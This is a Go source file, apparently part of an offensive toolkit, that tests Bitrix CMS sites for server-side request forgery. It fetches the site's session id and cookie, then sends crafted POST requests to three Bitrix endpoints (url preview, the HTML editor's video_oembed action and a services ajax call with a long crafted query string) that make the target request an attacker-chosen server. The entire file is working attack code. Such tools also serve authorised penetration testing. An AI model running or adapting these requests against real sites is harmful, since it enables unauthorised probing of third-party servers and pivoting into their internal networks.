package ssrf

import (
	"bytes"
	"fmt"
	"net/http"
	"github.com/indigo-sadland/quick-tricks/modules/tokens"
	"strings"
)

const (
	endpoint1 = "/bitrix/components/bitrix/main.urlpreview/ajax.php"
	endpoint2 = "/bitrix/tools/html_editor_action.php"
	endpoint3 = `/bitrix/services/main/ajax.php?action=attachUrlPreview&show_actions=y&buildd_preview=y&die_step=3&admin_section=Y&show_cache_stat1=Y&clear_cache=Y&c=bitrix:main.urlpreview&mode=ajax&=&sessid=<SESSID>&signedParamsString=1.12&listSubscribeId[]=1&itemId=1&deleteSubscribe=Y&userFieldId=0&elementId=1`
)

func Detect(target, server string) ([][]string, []error) {
	var errors []error
	endpoints := []string{endpoint1, endpoint2, endpoint3}

	compositeData, cookie, err := tokens.Get(target)
	if err != nil {
		errors = append(errors, err)
		return nil, errors
	}
	if compositeData == nil {
		err = fmt.Errorf("Unable to access composite data.")
		errors = append(errors, err)
		return nil, errors
	}

	var client http.Client
	var urls [][]string
	var reqContent string

	bitrixSessid := compositeData.BitrixSessid
	for i, e := range endpoints {
		url := target + e
		if i == 0 {
			reqContent = fmt.Sprintf("sessid=%s&userFieldId=1&action=attachUrlPreview&url=%s", bitrixSessid, server)
		}
		if i == 1 {
			reqContent = fmt.Sprintf("sessid=%s&action=video_oembed&video_source=%s", bitrixSessid, server)
		}
		if i == 2 {
			url = target + strings.Replace(e, "<SESSID>", bitrixSessid, 1)
			reqContent = fmt.Sprintf("url=%s/index.php?id=1", server)
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(reqContent)))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.AddCookie(cookie)
		resp1, err := client.Do(req)
		if err != nil {
			errors = append(errors, err)
		} else {
			if resp1.StatusCode == 200 {
				var d []string
				d = append(d, url)
				d = append(d, reqContent)
				urls = append(urls, d)
			}
		}
	}

	return urls, nil
}
